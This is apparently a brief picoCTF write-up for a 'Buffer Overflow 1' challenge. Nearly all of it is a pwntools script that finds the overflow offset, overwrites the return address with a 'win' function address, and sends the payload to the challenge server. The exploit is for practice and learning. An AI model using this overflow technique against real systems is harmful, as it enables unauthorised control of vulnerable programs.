# Buffer Overflow 1
Simple Buffer Overflow.

```python
from pwn import *

context(arch = 'i386', os = 'linux')

g = cyclic_gen()
payload = g.get(100)

print("OFFSET", cyclic_find(p32(0x6161616c)))


vuln = ELF('./vuln')
win = p32(vuln.symbols['win'])
print("WIN", win)
payload = b'A' * 44 + win
print("PAYLOAD:", payload)

r = process('./vuln')
r = remote('saturn.picoctf.net', 55581)
print(r.sendline(payload))
r.interactive()
```
